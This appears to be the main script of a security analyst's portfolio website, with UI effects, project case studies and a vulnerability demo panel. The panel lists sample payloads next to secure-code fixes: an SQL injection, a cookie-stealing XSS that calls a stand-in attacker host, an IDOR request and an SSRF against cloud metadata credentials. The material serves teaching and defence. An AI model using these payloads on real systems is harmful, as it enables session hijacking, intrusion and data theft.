/**
 * Main Application Orchestrator (Enhanced Organization)
 * Manages:
 * - Scroll Reading Progress Bar
 * - Dynamic Active Nav Highlighting
 * - Interactive Skill Category Filtering
 * - Interactive Project Category Filtering
 * - Live HUD Telemetry & Clocks
 * - DEFCON Alert Shift
 * - CVSS Vulnerability Lab
 * - 3D Card Hover & Tilt
 * - Modals & Procedural Audio Feedback
 */

document.addEventListener('DOMContentLoaded', () => {
  initLiveTelemetry();
  initScrollProgressAndNav();
  initFilterTabs();
  initAudioControls();
  initDefconControls();
  init3DTiltEffects();
  initVulnerabilityLab();
  initProjectModals();
  initSmoothScroll();
  initSoundEffectsOnHover();
});

/* ==========================================================================
   1. Live HUD Telemetry & Clocks
   ========================================================================== */
function initLiveTelemetry() {
  const clockEl = document.getElementById('hud-clock');
  const pingEl = document.getElementById('hud-ping');

  function updateClock() {
    const now = new Date();
    const utc = now.toUTCString().slice(17, 25) + ' UTC';
    if (clockEl) clockEl.textContent = utc;
  }
  setInterval(updateClock, 1000);
  updateClock();

  if (pingEl) {
    setInterval(() => {
      const ping = Math.floor(12 + Math.random() * 8);
      pingEl.textContent = `${ping}ms`;
    }, 3000);
  }
}

/* ==========================================================================
   2. Reading Progress Bar & Active Section Tracker
   ========================================================================== */
function initScrollProgressAndNav() {
  const progressBar = document.getElementById('scroll-progress-bar');
  const navLinks = document.querySelectorAll('.nav-link');
  const sections = document.querySelectorAll('section[id]');

  window.addEventListener('scroll', () => {
    // 1. Reading progress bar
    const winScroll = document.documentElement.scrollTop || document.body.scrollTop;
    const height = document.documentElement.scrollHeight - document.documentElement.clientHeight;
    const scrolled = (winScroll / height) * 100;
    if (progressBar) {
      progressBar.style.width = scrolled + '%';
    }

    // 2. Active section link highlighting
    let currentSection = '';
    sections.forEach(sec => {
      const secTop = sec.offsetTop - 120;
      const secHeight = sec.offsetHeight;
      if (winScroll >= secTop && winScroll < secTop + secHeight) {
        currentSection = sec.getAttribute('id');
      }
    });

    navLinks.forEach(link => {
      link.classList.remove('active');
      if (link.getAttribute('href') === `#${currentSection}`) {
        link.classList.add('active');
      }
    });
  }, { passive: true });
}

/* ==========================================================================
   3. Interactive Skill & Project Filter Tabs
   ========================================================================== */
function initFilterTabs() {
  // Skill Filters
  const skillBtns = document.querySelectorAll('[data-filter]');
  const skillCards = document.querySelectorAll('.skill-category-card');

  skillBtns.forEach(btn => {
    btn.addEventListener('click', () => {
      skillBtns.forEach(b => b.classList.remove('active'));
      btn.classList.add('active');

      const filter = btn.dataset.filter;
      skillCards.forEach(card => {
        if (filter === 'all' || card.dataset.category === filter) {
          card.style.display = 'block';
          card.style.opacity = '1';
        } else {
          card.style.display = 'none';
          card.style.opacity = '0';
        }
      });

      if (window.cyberAudio) window.cyberAudio.playClick();
    });
  });

  // Project Filters
  const projBtns = document.querySelectorAll('[data-project-filter]');
  const projCards = document.querySelectorAll('.projects-grid .tilt-card');

  projBtns.forEach(btn => {
    btn.addEventListener('click', () => {
      projBtns.forEach(b => b.classList.remove('active'));
      btn.classList.add('active');

      const filter = btn.dataset.projectFilter;
      projCards.forEach(card => {
        if (filter === 'all' || card.dataset.projCat === filter) {
          card.style.display = 'flex';
          card.style.opacity = '1';
        } else {
          card.style.display = 'none';
          card.style.opacity = '0';
        }
      });

      if (window.cyberAudio) window.cyberAudio.playClick();
    });
  });
}

/* ==========================================================================
   4. Audio Controller & Sound Visualizer
   ========================================================================== */
function initAudioControls() {
  const toggleBtn = document.getElementById('audio-toggle-btn');
  const waveBars = document.querySelectorAll('.sound-bar');

  if (!toggleBtn) return;

  toggleBtn.addEventListener('click', () => {
    if (window.cyberAudio) {
      const isEnabled = window.cyberAudio.toggle();
      toggleBtn.classList.toggle('active', isEnabled);
      waveBars.forEach(bar => {
        bar.style.animationPlayState = isEnabled ? 'running' : 'paused';
      });
      if (isEnabled) {
        window.cyberAudio.playClick();
      }
    }
  });

  const firstClickUnlock = () => {
    if (window.cyberAudio && !window.cyberAudio.ctx) {
      window.cyberAudio.init();
    }
    document.removeEventListener('click', firstClickUnlock);
  };
  document.addEventListener('click', firstClickUnlock, { once: true });
}

/* ==========================================================================
   5. DEFCON Alert Level Controller
   ========================================================================== */
function initDefconControls() {
  const defconPills = document.querySelectorAll('.defcon-pill');

  defconPills.forEach(pill => {
    pill.addEventListener('click', () => {
      const level = parseInt(pill.dataset.defcon, 10);
      defconPills.forEach(p => p.classList.remove('active'));
      pill.classList.add('active');

      if (window.cyberScene) {
        window.cyberScene.setDefcon(level);
      }

      if (window.cyberAudio) {
        if (level === 1) window.cyberAudio.playAlert();
        else window.cyberAudio.playClick();
      }

      document.body.classList.remove('defcon-5', 'defcon-3', 'defcon-1');
      document.body.classList.add(`defcon-${level}`);
    });
  });
}

/* ==========================================================================
   6. 3D Card Hover & Parallax Tilt
   ========================================================================== */
function init3DTiltEffects() {
  const tiltCards = document.querySelectorAll('.tilt-card');

  tiltCards.forEach(card => {
    card.addEventListener('mousemove', (e) => {
      const rect = card.getBoundingClientRect();
      const x = e.clientX - rect.left;
      const y = e.clientY - rect.top;

      const centerX = rect.width / 2;
      const centerY = rect.height / 2;

      const rotateX = ((y - centerY) / centerY) * -10;
      const rotateY = ((x - centerX) / centerX) * 10;

      card.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) translateY(-4px)`;

      const glare = card.querySelector('.card-glare');
      if (glare) {
        const percentX = (x / rect.width) * 100;
        const percentY = (y / rect.height) * 100;
        glare.style.background = `radial-gradient(circle at ${percentX}% ${percentY}%, rgba(0, 240, 255, 0.22), transparent 70%)`;
      }
    });

    card.addEventListener('mouseleave', () => {
      card.style.transform = `perspective(1000px) rotateX(0deg) rotateY(0deg) translateY(0px)`;
      const glare = card.querySelector('.card-glare');
      if (glare) glare.style.background = 'transparent';
    });
  });
}

/* ==========================================================================
   7. Interactive OWASP & CVSS 3.1 Vulnerability Lab
   ========================================================================== */
function initVulnerabilityLab() {
  const labData = {
    sqli: {
      name: 'SQL Injection (SQLi) - Authentication Bypass & Data Exfiltration',
      cwe: 'CWE-89: Improper Neutralization of Special Elements used in an SQL Command',
      owasp: 'OWASP Top 10 - A03:2021-Injection',
      cvssScore: 9.8,
      cvssSeverity: 'CRITICAL',
      cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
      attackPayload: `' OR 1=1; UNION SELECT null, username, password_hash, role FROM enterprise_users -- -`,
      remediationDiff: `
<span class="diff-rem">// VULNERABLE CODE (Direct string concatenation):</span>
<span class="diff-rem">const query = \`SELECT * FROM users WHERE user='\${req.body.user}' AND pass='\${req.body.pass}'\`;</span>

<span class="diff-add">// MITHRA'S REMEDIATION (Parameterized Prepared Statement & ORM validation):</span>
<span class="diff-add">const query = 'SELECT id, username, role FROM users WHERE username = ? AND password_hash = ?';</span>
<span class="diff-add">const [rows] = await db.execute(query, [sanitizedUser, hashedPass]);</span>
<span class="diff-add">if (!rows.length) throw new SecurityAuthError('Invalid credentials');</span>
      `,
      strategy: 'Enforced parameterized SQL queries across all database drivers. Eliminated raw string interpolation, integrated automated SQLMap regress tests in CI/CD pipeline, and established least-privilege DB credentials.'
    },
    xss: {
      name: 'Cross-Site Scripting (Stored XSS) - Session Hijack & DOM Injection',
      cwe: 'CWE-79: Improper Neutralization of Input During Web Page Generation',
      owasp: 'OWASP Top 10 - A03:2021-Injection',
      cvssScore: 8.2,
      cvssSeverity: 'HIGH',
      cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N',
      attackPayload: `&lt;svg/onload=fetch('https://c2.attacker.net/steal?c='+document.cookie)&gt;`,
      remediationDiff: `
<span class="diff-rem">// VULNERABLE CODE:</span>
<span class="diff-rem">document.getElementById('profile-bio').innerHTML = userBio;</span>

<span class="diff-add">// MITHRA'S REMEDIATION (Context-Aware Output Encoding & Strict CSP):</span>
<span class="diff-add">import DOMPurify from 'dompurify';</span>
<span class="diff-add">document.getElementById('profile-bio').textContent = DOMPurify.sanitize(userBio);</span>
<span class="diff-add">// Enforced HTTP Header:</span>
<span class="diff-add">Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';</span>
      `,
      strategy: 'Deployed strict DOMPurify sanitization, set HttpOnly & SameSite=Strict cookies to prevent document.cookie access from any script injection, and configured Content-Security-Policy (CSP).'
    },
    idor: {
      name: 'Insecure Direct Object Reference (IDOR) / Broken Access Control',
      cwe: 'CWE-639: Authorization Bypass Through User-Controlled Key',
      owasp: 'OWASP Top 10 - A01:2021-Broken Access Control',
      cvssScore: 8.6,
      cvssSeverity: 'HIGH',
      cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N',
      attackPayload: `GET /api/v1/patient/records?patient_id=98432 HTTP/1.1\nCookie: session=attacker_token`,
      remediationDiff: `
<span class="diff-rem">// VULNERABLE CODE:</span>
<span class="diff-rem">const record = await PatientRecord.findById(req.query.patient_id);</span>
<span class="diff-rem">return res.json(record);</span>

<span class="diff-add">// MITHRA'S REMEDIATION (RBAC & Tenant Ownership Verification):</span>
<span class="diff-add">const currentUserId = req.session.user.id;</span>
<span class="diff-add">const record = await PatientRecord.findOne({</span>
<span class="diff-add">  _id: req.query.patient_id,</span>
<span class="diff-add">  $or: [{ ownerId: currentUserId }, { authorizedDoctorId: currentUserId }]</span>
<span class="diff-add">});</span>
<span class="diff-add">if (!record) return res.status(403).json({ error: 'Access Denied: Unauthorized Record' });</span>
      `,
      strategy: 'Replaced direct sequential IDs with cryptographic UUIDv4; implemented strict server-side authorization middleware enforcing user ownership checks before returning object records.'
    },
    ssrf: {
      name: 'Server-Side Request Forgery (SSRF) - Cloud Metadata Exfiltration',
      cwe: 'CWE-918: Server-Side Request Forgery (SSRF)',
      owasp: 'OWASP Top 10 - A10:2021-Server-Side Request Forgery',
      cvssScore: 9.1,
      cvssSeverity: 'CRITICAL',
      cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N',
      attackPayload: `POST /api/fetch-webhook HTTP/1.1\nBody: {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}`,
      remediationDiff: `
<span class="diff-rem">// VULNERABLE CODE:</span>
<span class="diff-rem">const res = await axios.get(req.body.url);</span>

<span class="diff-add">// MITHRA'S REMEDIATION (Strict IP Allowlist & Cloud Metadata Blocking):</span>
<span class="diff-add">const parsed = new URL(req.body.url);</span>
<span class="diff-add">const ip = await dns.lookup(parsed.hostname);</span>
<span class="diff-add">if (isPrivateIP(ip.address) || ip.address === '169.254.169.254') {</span>
<span class="diff-add">  throw new SecurityBreachError('Target resolves to prohibited internal/metadata IP');</span>
<span class="diff-add">}</span>
      `,
      strategy: 'Implemented DNS-rebinding protection and blocked requests targeting RFC 1918 private IP subnets and AWS/GCP cloud instance metadata services (169.254.169.254).'
    },
    brokenauth: {
      name: 'Broken Authentication & Brute Force Vulnerability',
      cwe: 'CWE-307: Improper Restriction of Excessive Authentication Attempts',
      owasp: 'OWASP Top 10 - A07:2021-Identification and Authentication Failures',
      cvssScore: 8.8,
      cvssSeverity: 'HIGH',
      cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N',
      attackPayload: `POST /api/login HTTP/1.1 (Hydra / Burp Intruder 50,000 dictionary attack requests)`,
      remediationDiff: `
<span class="diff-rem">// VULNERABLE CODE:</span>
<span class="diff-rem">app.post('/api/login', authHandler); // No rate limiter, no lockout, plain text compare</span>

<span class="diff-add">// MITHRA'S REMEDIATION (Distributed Rate Limiting + Argon2 + 2FA):</span>
<span class="diff-add">const loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 });</span>
<span class="diff-add">app.post('/api/login', loginLimiter, async (req, res) => {</span>
<span class="diff-add">  const isValid = await argon2.verify(user.passHash, req.body.password);</span>
<span class="diff-add">  if (!isValid) return res.status(401).send('Credentials Invalid');</span>
<span class="diff-add">  return res.json({ requireMFA: true, tempToken: issueMfaChallenge(user) });</span>
<span class="diff-add">});</span>
      `,
      strategy: 'Integrated Redis-backed IP/Account rate limiting, enforced Argon2id password hashing, and integrated Twilio Segment 2-Step OTP authentication.'
    }
  };

  const buttons = document.querySelectorAll('.vuln-selector-btn');
  const titleEl = document.getElementById('vuln-name');
  const cweEl = document.getElementById('vuln-cwe');
  const owaspEl = document.getElementById('vuln-owasp');
  const scoreEl = document.getElementById('vuln-score');
  const severityEl = document.getElementById('vuln-severity');
  const vectorEl = document.getElementById('vuln-vector');
  const payloadEl = document.getElementById('vuln-payload');
  const diffEl = document.getElementById('vuln-diff');
  const strategyEl = document.getElementById('vuln-strategy');

  function renderVulnerability(key) {
    const v = labData[key];
    if (!v) return;

    if (titleEl) titleEl.textContent = v.name;
    if (cweEl) cweEl.textContent = v.cwe;
    if (owaspEl) owaspEl.textContent = v.owasp;
    if (scoreEl) scoreEl.textContent = v.cvssScore.toFixed(1);
    if (severityEl) {
      severityEl.textContent = v.cvssSeverity;
      severityEl.className = `badge severity-${v.cvssSeverity.toLowerCase()}`;
    }
    if (vectorEl) vectorEl.textContent = v.cvssVector;
    if (payloadEl) payloadEl.innerHTML = v.attackPayload;
    if (diffEl) diffEl.innerHTML = v.remediationDiff;
    if (strategyEl) strategyEl.textContent = v.strategy;

    if (window.cyberScene) {
      window.cyberScene.triggerEMP();
    }
    if (window.cyberAudio) {
      window.cyberAudio.playScan();
    }
  }

  buttons.forEach(btn => {
    btn.addEventListener('click', () => {
      buttons.forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      renderVulnerability(btn.dataset.vuln);
    });
  });

  if (buttons.length > 0) {
    renderVulnerability('sqli');
  }
}

/* ==========================================================================
   8. Project Modals & Detailed Case Studies
   ========================================================================== */
function initProjectModals() {
  const modal = document.getElementById('project-modal');
  const modalTitle = document.getElementById('modal-project-title');
  const modalBody = document.getElementById('modal-project-content');
  const closeBtn = document.getElementById('modal-close-btn');
  const detailBtns = document.querySelectorAll('.view-project-details');

  const projectDetails = {
    'apk': {
      title: 'APK Analysis & Mobile Security Testing',
      role: 'Mobile Penetration Tester & Security Researcher',
      overview: 'Conducted in-depth static and dynamic application security testing (SAST/DAST) on Android packages (APKs) to uncover vulnerabilities and privacy violations.',
      tools: ['Kali Linux', 'Jadx-GUI', 'Frida', 'ADB', 'MobSF', 'Burp Suite Proxy'],
      keyFindings: [
        'Hardcoded API credentials and cryptographic seeds discovered inside decompiled Java classes.',
        'Insecure local data storage utilizing unencrypted SQLite databases and world-readable SharedPreferences.',
        'Exported Broadcast Receivers and Intent Filters susceptible to unauthorized intent spoofing and privilege escalation.',
        'Improper TLS certificate validation allowing MITM traffic interception.'
      ],
      remediation: 'Implemented Android Keystore encryption for all secrets, enabled Network Security Config with certificate pinning, and unexported unnecessary application components.'
    },
    'chat': {
      title: 'Vulnerability-Aware Chat Application',
      role: 'Lead Architect & Security Engineer',
      overview: 'Engineered a real-time secure messaging application capable of inspecting links and attachments on the fly to protect users against phishing and drive-by downloads.',
      tools: ['Node.js', 'WebSocket', 'Python', 'OWASP ZAP API', 'VirusTotal Engine', 'Redis'],
      keyFindings: [
        'Simulated phishing URLs intercepted with sub-100 millisecond inspection latency.',
        'Pre-rendering URL preview generation sandboxed inside an isolated runtime container.',
        'Stored and Reflected XSS vectors sanitized before message broadcast across WebSocket channels.'
      ],
      remediation: 'Integrated DOMPurify client/server-side sanitization, sandboxed URL head queries, and implemented zero-trust outbound request validation.'
    },
    'hospital': {
      title: 'Secure Hospital Web Portal',
      role: 'Application Security Engineer & Full-Stack Developer',
      overview: 'Developed a verification-centric medical portal safeguarding Electronic Health Records (EHR) with multi-factor authentication and role-based permissions.',
      tools: ['React', 'Node.js', 'Twilio Segment', 'PostgreSQL', 'Argon2id', 'JWT with Rotation'],
      keyFindings: [
        'Integrated Twilio 2-step SMS/OTP verification to protect physician and patient login gateways.',
        'Eliminated Broken Object Level Authorization (BOLA/IDOR) via strict UUID validation and user ownership checks.',
        'Protected all patient endpoints with automated HTTP security headers (HSTS, CSP, X-Frame-Options).'
      ],
      remediation: 'Maintained 100% compliance with OWASP Top 10 guidelines and passed internal penetration testing without critical or high vulnerabilities.'
    },
    'fim': {
      title: 'Automated File Integrity Monitoring (FIM) Tool',
      role: 'System Security Developer',
      overview: 'Created an autonomous real-time endpoint auditing daemon that continuously monitors critical system directories (/etc, /bin, System32) for unauthorized modifications.',
      tools: ['Python 3', 'Cryptographic Hashing (SHA-256)', 'Watchdog API', 'SQLite', 'SMTP Alerts'],
      keyFindings: [
        'Baseline snapshotting captures cryptographic checksums and permission bitmasks across 10,000+ files.',
        'Real-time event hook identifies unauthorized edits, file creations, deletions, and permission changes within 50ms.',
        'Generates instant security alert dispatch with automated diff generation and quarantine suggestions.'
      ],
      remediation: 'Delivered an efficient, lightweight agent consuming under 1.5% CPU that immediately flags rootkit tampering and unauthorized configuration drift.'
    },
    'crypto': {
      title: 'Hybrid Cryptography Framework',
      role: 'Cryptographic Systems Engineer',
      overview: 'Engineered a high-assurance dual-tier encryption framework combining symmetric speed and asymmetric security for sensitive enterprise telemetry and file transfers.',
      tools: ['Python', 'AES-256-GCM', 'RSA-4096', 'PBKDF2 HMAC-SHA256', 'OpenSSL'],
      keyFindings: [
        'AES-256 in Galois/Counter Mode (GCM) ensures high-throughput authenticated encryption with built-in integrity tags.',
        'RSA-4096 public key encryption encapsulates symmetric ephemeral session keys.',
        'Digital signature verification ensures sender non-repudiation and thwarts tampering.'
      ],
      remediation: 'Achieved zero plain-text leakage in transit and resistance against replay attacks via timestamped nonces.'
    },
    'n8n': {
      title: 'Automated Business Workflows & AI Intelligence Pipeline',
      role: 'Automation & Integration Engineer',
      overview: 'Constructed resilient event-driven workflows integrating Qualys security telemetry, order dispatch alerts, daily stock reconciliations, and AI-generated executive summaries.',
      tools: ['n8n Workflow Automation', 'AI Prompt Engineering', 'REST APIs', 'Twilio WhatsApp API', 'SendGrid'],
      keyFindings: [
        'Automated real-time Qualys VMDR vulnerability digest routing directly to engineering slack channels.',
        'Engineered AI prompt pipelines that synthesize technical CVE vulnerability outputs into concise executive business summaries.',
        'Automated order and stock discrepancy notifications over WhatsApp and encrypted email channels.'
      ],
      remediation: 'Reduced daily operational reporting effort by 85% and lowered response latency from 6 hours to under 3 minutes.'
    }
  };

  if (!modal) return;

  detailBtns.forEach(btn => {
    btn.addEventListener('click', (e) => {
      e.preventDefault();
      const pId = btn.dataset.project;
      const data = projectDetails[pId];
      if (!data) return;

      modalTitle.textContent = data.title;
      modalBody.innerHTML = `
        <div class="modal-role-badge">${data.role}</div>
        <p class="modal-overview">${data.overview}</p>

        <h4 class="modal-subtitle">Security Toolchain & Tech:</h4>
        <div class="modal-tags">
          ${data.tools.map(t => `<span class="tech-tag">${t}</span>`).join('')}
        </div>

        <h4 class="modal-subtitle">Key Security Findings & Mechanics:</h4>
        <ul class="modal-list">
          ${data.keyFindings.map(f => `<li>${f}</li>`).join('')}
        </ul>

        <h4 class="modal-subtitle">Remediation & Security Posture Impact:</h4>
        <div class="modal-remediation-box">${data.remediation}</div>
      `;

      modal.classList.add('active');
      if (window.cyberAudio) window.cyberAudio.playClick();
    });
  });

  if (closeBtn) {
    closeBtn.addEventListener('click', () => {
      modal.classList.remove('active');
      if (window.cyberAudio) window.cyberAudio.playClick();
    });
  }

  modal.addEventListener('click', (e) => {
    if (e.target === modal) {
      modal.classList.remove('active');
    }
  });
}

/* ==========================================================================
   9. Smooth Scrolling & Navigation
   ========================================================================== */
function initSmoothScroll() {
  const links = document.querySelectorAll('a[href^="#"]');

  links.forEach(link => {
    link.addEventListener('click', (e) => {
      const targetId = link.getAttribute('href');
      if (targetId === '#') return;

      const target = document.querySelector(targetId);
      if (target) {
        e.preventDefault();
        target.scrollIntoView({ behavior: 'smooth' });
        if (window.cyberAudio) window.cyberAudio.playClick();
      }
    });
  });
}

/* ==========================================================================
   10. Audio Feedback on Interactive Elements
   ========================================================================== */
function initSoundEffectsOnHover() {
  const interactiveElements = document.querySelectorAll('.cyber-btn, .nav-link, .defcon-pill, .vuln-selector-btn, .filter-tab-btn, .tilt-card, .cert-card');

  interactiveElements.forEach(el => {
    el.addEventListener('mouseenter', () => {
      if (window.cyberAudio) {
        window.cyberAudio.playHover();
      }
    });
  });
}

/* ==========================================================================
   11. Fast Secure Transmission Dispatcher to WhatsApp (+91 93429 15874)
   ========================================================================== */
window.dispatchToWhatsApp = function(event) {
  event.preventDefault();

  const sender = document.getElementById('dispatch-sender').value.trim();
  const email = document.getElementById('dispatch-email').value.trim();
  const payload = document.getElementById('dispatch-payload').value.trim();
  const btn = document.getElementById('dispatch-btn');

  const phone = '919342915874';

  const message = 
`🛡️ *SECURE TRANSMISSION // MITHRA KHANTH PORTFOLIO*
----------------------------------------
👤 *From / Org:* ${sender}
📧 *Email:* ${email}
📝 *Transmission Payload:*
${payload}
----------------------------------------
🔒 *Status:* Encrypted Packet Dispatched
🌐 *Source:* Mithra Khanth S (Security Analyst Portfolio)`;

  const encodedMessage = encodeURIComponent(message);
  const whatsappUrl = `https://api.whatsapp.com/send?phone=${phone}&text=${encodedMessage}`;

  // Audio & Visual Feedback
  if (window.cyberAudio) window.cyberAudio.playClick();
  if (window.cyberScene) window.cyberScene.triggerEMP();

  if (btn) {
    const originalText = btn.innerHTML;
    btn.innerHTML = `<span>✓ PACKET TRANSMITTED TO WHATSAPP...</span>`;
    btn.style.background = '#25d366';
    btn.style.color = '#030712';
    
    setTimeout(() => {
      btn.innerHTML = originalText;
      btn.style.background = '';
      btn.style.color = '';
    }, 4000);
  }

  // Open WhatsApp Web or App
  window.open(whatsappUrl, '_blank');
};
